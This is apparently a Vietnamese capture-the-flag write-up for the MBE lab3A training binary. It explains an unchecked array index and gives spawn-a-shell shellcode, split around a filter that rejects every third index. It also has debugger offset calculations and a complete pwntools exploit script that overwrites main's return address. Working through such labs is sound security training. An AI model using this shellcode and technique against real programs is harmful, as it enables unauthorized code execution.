# Program 

### Bài này sẽ cho chúng ta 1 chương trình, mình xin được phép tóm tắt như sau:
* store_number: nhập số và nhập index, thỏa điều kiện ---> lưu
* read_number: nhập index ---> xuất ra giá trị tại index đó 
* main: clear env và arg, chạy vòng lặp while true.

Thoạt đầu thì nhìn chương trình rất bình thường, vậy lỗi ở đâu???
Chúng ta cùng xem qua hàm store_number:
```sh
int store_number(unsigned int * data)
{
    unsigned int input = 0;
    unsigned int index = 0;

    /* get number to store */
    printf(" Number: ");
    input = get_unum();

    /* get index to store at */
    printf(" Index: ");
    index = get_unum();

    /* make sure the slot is not reserved */
    if(index % 3 == 0 || (input >> 24) == 0xb7)
    {
        printf(" *** ERROR! ***\n");
        printf("   This index is reserved for quend!\n");
        printf(" *** ERROR! ***\n");

        return 1;
    }

    /* save the number to data storage */
    data[index] = input;

    return 0;
}
```

mình nhận ra rằng chổ lưu dữ liệu của mình có thể bị lỗi, vì không kiểm tra điều kiện. Và mảng data chỉ khai báo có 100 phần tử. Nhưng có nó thể lưu các dữ liệu ở những nơi mà không phải dành cho mảng data.
Vậy mình sẽ dùng shellcode để spawn shell gồm 23 ký tự.
### Nhưng một điều nữa đó là lệnh if trong hàm store_number trên không cho phép chúng ta ghi đè shellcode 1 cách liên tiếp.


# solution

Chúng ta sẽ tạo shellcode động (cái tên này mình tự đặt thôi), tức là shellcode của chúng ta sẽ được đặt cách nhau những khoản cố định. 

Vì index % 3  == 0, không được phép sử dụng để đặt dữ liệu vào.

Vì thế chúng ta chỉ còn có `2 index` liền kề. `1 index` sẽ chứa 4 byte.
2 index sẽ chứa được 8 byte.
chúng ta sẽ chia như sau: 6 byte đầu chứa dữ liệu (cụ thể là shellcode), 2 byte cuối chứa lệnh nhảy(hoặc lệnh bỏ qua phần tử).

Đây là shellcode ban đầu:
`shellcode = "\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x89\xC1\x89\xC2\xB0\x0B\xCD\x80" `

Và đây là shellcode sau khi đã được điều chỉnh:

```sh

\x31 \xc0 \x50 \x90 

\x90 \x90 \xeb \x04

\x68 \x2f \x2f \x73   

\x68 \x90 \xeb \x04

\x68 \x2f \x62 \x69  

\x6e \x90 \xeb \x04
  
\x89 \xe3 \x89 \xc1   

\x89 \xc2 \xeb \x04

\xb0 \x0b \xcd \x80

```

\xeb\x04 là lệnh nhảy đến nơi chứa shellcode tiếp theo, hoặc là lệnh bỏ qua 4 byte.

Có được shellcode rồi thì chúng ta sẽ đến bước tiếp theo:

mình sẽ kiểm tra security của file
```sh
pwndbg> checksec
[*] '/home/zir/ctf/TrainingPwn/MBE_release/levels/lab03/lab3A'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments

```
Đặt 2 breakpoint ở hàm store_number và quit của main.

```sh
pwndbg> break * main + 341
Breakpoint 1 at 0x8048b67
pwndbg> break * main + 553
Breakpoint 2 at 0x8048c3b
```
Run để tính offset

```sh
────────────────────────────[ DISASM ]─────────────────────────────

 ► 0x8048b67 <main+341>    call   store_number <store_number>
        arg[0]: 0xffffcec8 ◂— 0x0
        arg[1]: 0x8048f5d ◂— jae    0x8048fd3 /* 'store' */
        arg[2]: 0x5
        arg[3]: 0x9

--------------------------------------------------------------------
pwndbg> ni
 Number: 1234
 Index: 1
--------------------------------------------------------------------

pwndbg> c
Continuing.
 Completed store command successfully
Input command: quit

--------------------------------------------------------------------
 EAX  0x0
*EBX  0x0
*ECX  0x0
*EDX  0xffffd058 ◂— 'quit'
*EDI  0x0
 ESI  0xf7fb1000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c
*EBP  0x0
*ESP  0xffffd07c —▸ 0xf7df1f21 (__libc_start_main+241) ◂— add    esp, 0x10
*EIP  0x8048c3b (main+553) ◂— ret    
──────────────────────────────[ DISASM ]───────────────────────────

 ► 0x8048c3b  <main+553>                 ret             <0xf7df1f21; __libc_start_main+241>

--------------------------------------------------------------------

pwndbg> p/d 0xffffd07c-0xffffcec8
$1 = 436
pwndbg> p/d 436/4
$2 = 109

```

Vậy thì khi index bằng 109 thì sẽ là hàm main của chúng ta.
Viết file exploit như sau:
```sh
from pwn import *


def store(val,index):
	p.sendline("store")
	p.recv(100)
	p.sendline(str(val))
	p.recv(100)
	p.sendline(str(index))
	p.recv(100)

'''
\x31 \xc0 \x50 \x90 

\x90 \x90 \xeb \x04

\x68 \x2f \x2f \x73   

\x68 \x90 \xeb \x04

\x68 \x2f \x62 \x69  

\x6e \x90 \xeb \x04
  
\x89 \xe3 \x89 \xc1   

\x89 \xc2 \xeb \x04

\xb0 \x0b \xcd \x80

'''
add_buff = 0xffffcecc
while (1):	
	p = process("./lab3A")
	raw_input("DEBUG")
	store(0x9050c031,1)
	store(0x04eb9090,2)

	store(0x732f2f68,4)
	store(0x04eb9068,5)

	store(0x69622f68,7)
	store(0x04eb906e,8)

	store(0xc189e389,10)
	store(0x04ebc289,11)

	store(0x80cd0bb0,13)

	store(add_buff,109)

	p.sendline("quit")
	p.interactive()
	add_buff= add_buff + 4
```
sau khi run file sẽ tăng dần các địa chỉ return về shellcode. Do là khi chạy trên gdb sẽ có chút ít khác so với không dùng gdb vì các tham số, biến môi trường....v.v.

Run file exploit.py
```sh
[+] Starting local process './lab3A': pid 19252
DEBUG
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$ 

```
sẽ có thể gặp GOT EOF do địa chỉ ko đúng.
Nhấn `Enter` vài lần nữa để thay đổi địa chỉ

```sh
[*] Got EOF while sending in interactive
[+] Starting local process './lab3A': pid 19380
DEBUG
[*] Switching to interactive mode
$ 
$ 
$ 
$ id
uid=1000(zir) gid=1000(zir) groups=1000(zir),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)

```
Và tadaaa... :3

